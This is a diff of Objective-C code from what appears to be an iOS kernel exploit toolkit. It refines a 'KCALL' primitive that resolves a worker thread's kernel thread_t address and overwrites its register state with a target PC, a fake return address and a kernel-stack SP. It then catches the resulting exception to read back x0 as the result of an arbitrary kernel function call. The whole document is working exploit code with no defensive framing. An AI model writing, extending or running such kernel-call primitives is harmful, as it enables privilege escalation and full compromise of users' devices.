@@ -3676,9 +3676,15 @@ static void *kpKcParkWorker(void *arg)
     if (pthread_create(&wpt, NULL, kpKcParkWorker, NULL) != 0) {
         [r appendString:@"FAIL: pthread_create\n"]; return r;
     }
+    usleep(20000); // let worker enter park loop
     mach_port_t wport = pthread_mach_thread_np(wpt);
+    kpNote(r, [NSString stringWithFormat:@"  worker port=%#x", wport]);
+    if (!wport) {
+        gKcStop = 1; pthread_join(wpt, NULL);
+        [r appendString:@"FAIL: mach thread port\n"]; return r;
+    }
     uint64_t threadVA = [self rcResolveThreadKVA:wport];
-    kpNote(r, [NSString stringWithFormat:@"  worker port=%#x thread_t=%#llx", wport, (unsigned long long)threadVA]);
+    kpNote(r, [NSString stringWithFormat:@"  thread_t=%#llx", (unsigned long long)threadVA]);
     if (!threadVA) {
         gKcStop = 1; pthread_join(wpt, NULL);
         [r appendString:@"FAIL: worker thread_t\n"]; return r;
@@ -3704,51 +3710,57 @@ static void *kpKcParkWorker(void *arg)
 
     mach_port_t excport = kp_createexcport();
     if (!excport) {
-        gKcStop = 1; pthread_join(wpt, NULL);
+        gKcStop = 1; pthread_detach(wpt);
         [r appendString:@"FAIL: exc port\n"]; return r;
     }
-    kern_return_t kr = thread_set_exception_ports(wport, EXC_MASK_ALL, excport,
+    kern_return_t kr = thread_set_exception_ports(wport,
+        EXC_MASK_BAD_ACCESS | EXC_MASK_ARITHMETIC, excport,
         EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);
     kpNote(r, [NSString stringWithFormat:@"  exception_ports kr=%d", (int)kr]);
+
+    // Suspend before set_state — live thread_set_state is a userland crash class.
+    thread_suspend(wport);
+    kpNote(r, @"  suspended worker");
 
     kp_arm_thread_state64_internal st;
     memset(&st, 0, sizeof(st));
     st.__pc = target;
-    st.__lr = 0x401; // KP_FAKE_LR — fault on return → exception
-    st.__sp = (kstack ? (kstack - 0x200) : 0) & ~0xFULL;
+    st.__lr = 0x401;
+    st.__sp = (kstack ? (kstack - 0x400) : 0) & ~0xFULL;
     st.__x[0] = 0; st.__x[1] = 0;
-    kpNote(r, [NSString stringWithFormat:@"  setstate pc=%#llx lr=0x401 sp=%#llx", 
+    kpNote(r, [NSString stringWithFormat:@"  setstate pc=%#llx sp=%#llx", 
               (unsigned long long)target, (unsigned long long)st.__sp]);
 
-    if (!kp_threadsetstate(wport, threadVA, &st)) {
+    BOOL setOK = kp_threadsetstate(wport, threadVA, &st);
+    kpNote(r, [NSString stringWithFormat:@"  thread_set_state=%d", (int)setOK]);
+    if (!setOK) {
+        thread_resume(wport);
+        gKcStop = 1;
+        thread_terminate(wport);
+        pthread_detach(wpt);
         mach_port_destruct(mach_task_self(), excport, 0, 0);
-        gKcStop = 1; pthread_join(wpt, NULL);
         [r appendString:@"FAIL: thread_set_state\n"]; return r;
     }
     thread_resume(wport);
+    kpNote(r, @"  resumed — waiting exception");
 
-    kp_excmsg exc;
-    memset(&exc, 0, sizeof(exc));
-    BOOL got = kp_waitexc(excport, &exc, 3000);
+    // Receive buffer must be large enough for MACH_EXCEPTION_CODES messages.
+    uint8_t excbuf[0x400];
+    memset(excbuf, 0, sizeof(excbuf));
+    kp_excmsg *exc = (kp_excmsg *)excbuf;
+    BOOL got = kp_waitexc(excport, exc, 3000);
     kpNote(r, [NSString stringWithFormat:@"  waitexc=%d exc=%u code=%#llx",
-              (int)got, exc.exception, (unsigned long long)exc.codeFirst]);
-    uint64_t x0 = got ? exc.threadState.__x[0] : 0;
-    uint64_t pcOut = got ? exc.threadState.__pc : 0;
+              (int)got, exc->exception, (unsigned long long)exc->codeFirst]);
+    uint64_t x0 = got ? exc->threadState.__x[0] : 0;
+    uint64_t pcOut = got ? exc->threadState.__pc : 0;
     kpNote(r, [NSString stringWithFormat:@"  x0=%#llx pc_out=%#llx", (unsigned long long)x0, (unsigned long long)pcOut]);
     BOOL ok = got && x0 != 0;
-    kpNote(r, ok ? @"=== KCALL VALID ★★ (exception returned x0) ==="
-                 : @"=== KCALL no result (timeout / x0=0) ===");
+    kpNote(r, ok ? @"=== KCALL VALID ★★ ===" : @"=== KCALL no result ===");
 
-    // Cleanup — do not leave thread in kernel.
-    if (got) {
-        kp_arm_thread_state64_internal park;
-        memset(&park, 0, sizeof(park));
-        park.__pc = 0x401;
-        (void)kp_statereply(&exc, &park);
-    }
+    // Cleanup — never join a thread that may be in kernel.
     gKcStop = 1;
     thread_terminate(wport);
-    pthread_detach(wpt); // may be stuck in kernel — do not join
+    pthread_detach(wpt);
     mach_port_destruct(mach_task_self(), excport, 0, 0);
 
     [r appendFormat:@"\n[VERIFY] KCALL=%d X0=%#llx PC=%#llx TARGET=%#llx\n",
